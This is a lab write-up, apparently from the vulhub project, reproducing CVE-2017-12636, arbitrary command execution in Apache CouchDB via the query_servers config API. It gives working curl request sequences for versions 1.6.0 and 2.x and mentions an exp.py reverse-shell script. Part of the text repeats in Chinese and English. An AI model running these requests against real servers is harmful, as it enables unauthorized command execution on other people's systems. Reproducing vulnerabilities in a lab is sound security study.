# Couchdb Arbitrary Command Execution Vulnerability (CVE-2017-12636)

Apache CouchDB is an open source database that focuses on ease of use and becomes "a database that fully embraces the web." It is a NoSQL database that uses JSON as the storage format, JavaScript as the query language, MapReduce and HTTP as the API. Widely used, such as the BBC used in its dynamic content display platform, Credit Suisse uses the market framework of its internal merchandise department, Meebo, used in its social platforms (web and applications).

On November 15, 2017, CVE-2017-12635 and CVE-2017-12636 disclosed that CVE-2017-12636 is an arbitrary command execution vulnerability. We can modify the configuration of the couchdb by the config api `query_server`. It will be run when designing and executing the view.

Impact version: less than 1.7.0 and less than 2.1.1

Reference link:

 - http://bobao.360.cn/learning/detail/4716.html
 - https://justi.cz/security/2017/11/14/couchdb-rce-npm.html

## test environment

Couchdb 2.x and 1.x API interfaces are different, so this vulnerability is used in different ways. This environment starts with version 1.6.0. If you want to test version 2.1.0, you can start [CVE-2017-12635] (https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017 -12635) The attached environment.

Execute the following command to start the Couchdb 1.6.0 environment:

```
Docker-compose up -d
```

After the startup is complete, visit the http://your-ip:5984/` to see the Welcome page of Couchdb.

## Vulnerability recurrence

The vulnerability is triggered by the need to log in to the user. If you do not know the target administrator password, you can use [CVE-2017-12635] (https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017- 12635) First add an administrator user.

Description under ### 1.6.0

You can trigger any command execution by executing the following requests in sequence:

```
curl -X PUT 'http://vulhub:vulhub@your-ip:5984/_config/query_servers/cmd' -d '"id >/tmp/success"'
curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest'
curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest/vul' -d '{"_id":"770895a97726d5ca6d70a22173005c7b"}'
curl -X POST 'http://vulhub:vulhub@your-ip:5984/vultest/_temp_view?limit=10' -d '{"language":"cmd","map":""}' -H 'Content-Type:application/json'
```

其中,`vulhub:vulhub`为管理员账号密码。

第一个请求是添加一个名字为`cmd`的`query_servers`，其值为`"id >/tmp/success"`，这就是我们后面待执行的命令。

第二、三个请求是添加一个Database和Document，这里添加了后面才能查询。

第四个请求就是在这个Database里进行查询，因为我将language设置为`cmd`，这里就会用到我第一步里添加的名为`cmd`的`query_servers`，最后触发命令执行。

### 2.1.0 下的说明

2.1.0中修改了我上面用到的两个API，这里需要详细说明一下。

Couchdb 2.x 引入了集群，所以修改配置的API需要增加node name。这个其实也简单，我们带上账号密码访问`/_membership`即可：

```
curl http://vulhub:vulhub@your-ip:5984/_membership
```

![](1.png)

Among them, `vulhub:vulhub` is the administrator account password.

The first request is to add a `query_servers` with the name `cmd`, which has the value ``id >/tmp/success"`, which is the command we are going to execute later.

The second and third requests are to add a Database and a Document, which can be queried after adding it here.

The fourth request is to query in this Database, because I set the language to `cmd`, here I will use the `query_servers` named `cmd` added in my first step, and finally trigger the command to execute.

Description under ### 2.1.0

2.1.0 modified the two APIs I used above, which need to be explained in detail here.

Couchdb 2.x introduces a cluster, so modifying the configured API requires adding a node name. This is actually simple, we can use the account password to access `/_membership`:

```
Curl http://vulhub:vulhub@your-ip:5984/_membership
```

![](1.png)

Visible, we only have one node here, the name is `nonode@nohost`.

Then, we modify the configuration of `nonode@nohost`:

```
Curl -X PUT http://vulhub:vulhub@your-ip:5984/_node/nonode@nohost/_config/query_servers/cmd -d '"id >/tmp/success"'
```

![](2.png)

Then, in the same way as 1.6.0, we first add a Database and a Document:

```
curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest'
curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest/vul' -d '{"_id":"770895a97726d5ca6d70a22173005c7b"}'
```

Couchdb 2.x removed `_temp_view`, so we need to add a `_view` to trigger the commands defined in `query_servers`:

```
curl -X PUT http://vulhub:vulhub@your-ip:5984/vultest/_design/vul -d '{"_id":"_design/test","views":{"wooyun":{"map":""} },"language":"cmd"}' -H "Content-Type: application/json"
```

The command in `query_servers` is triggered by adding `_view`.

## Using scripts

Write a simple script [exp.py] (exp.py), modify the target and command for your test machine, then modify the version to the corresponding Couchdb version, successfully bounce the shell:

![](3.png)